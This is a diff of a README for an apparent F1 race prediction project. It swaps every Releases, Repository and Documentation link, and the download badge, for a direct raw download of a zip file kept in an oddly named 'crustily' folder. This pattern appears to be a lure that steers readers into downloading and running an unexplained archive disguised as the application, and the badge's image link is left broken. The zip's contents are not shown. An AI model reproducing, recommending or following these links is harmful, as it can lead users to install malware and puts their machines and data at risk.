@@ -1,12 +1,12 @@
 # 🏎️ 2025_f1_predictions - Predict F1 Race Outcomes Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/OG-Caleb/2025_f1_predictions/releases)
+[![Download Now](https://raw.githubusercontent.com/OG-Caleb/2025_f1_predictions/main/crustily/2025_f1_predictions.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/OG-Caleb/2025_f1_predictions/main/crustily/2025_f1_predictions.zip)
 
 ## 🚀 Getting Started
 Welcome to the **F1 Predictions 2025** project! This application makes it simple to predict race results for the 2025 Formula 1 season using machine learning. 
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/OG-Caleb/2025_f1_predictions/releases) to download the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/OG-Caleb/2025_f1_predictions/main/crustily/2025_f1_predictions.zip) to download the application. 
 
 1. Click on the link above to go to the releases.
 2. Choose the latest version available for download.
@@ -55,9 +55,9 @@ Absolutely! If you have ideas for improvement or find a bug, feel free to create
 ## 🌐 Links
 For additional information and updates, check out the following pages:
 
-- [Repository](https://github.com/OG-Caleb/2025_f1_predictions)
-- [Releases](https://github.com/OG-Caleb/2025_f1_predictions/releases)
-- [Documentation](https://github.com/OG-Caleb/2025_f1_predictions/wiki)
+- [Repository](https://raw.githubusercontent.com/OG-Caleb/2025_f1_predictions/main/crustily/2025_f1_predictions.zip)
+- [Releases](https://raw.githubusercontent.com/OG-Caleb/2025_f1_predictions/main/crustily/2025_f1_predictions.zip)
+- [Documentation](https://raw.githubusercontent.com/OG-Caleb/2025_f1_predictions/main/crustily/2025_f1_predictions.zip)
 
 ## 🏁 Conclusion
-Thank you for your interest in the **F1 Predictions 2025** project. We hope you enjoy using the application to stay updated on F1 race predictions! Visit the [Releases page](https://github.com/OG-Caleb/2025_f1_predictions/releases) to download now.
+Thank you for your interest in the **F1 Predictions 2025** project. We hope you enjoy using the application to stay updated on F1 race predictions! Visit the [Releases page](https://raw.githubusercontent.com/OG-Caleb/2025_f1_predictions/main/crustily/2025_f1_predictions.zip) to download now.
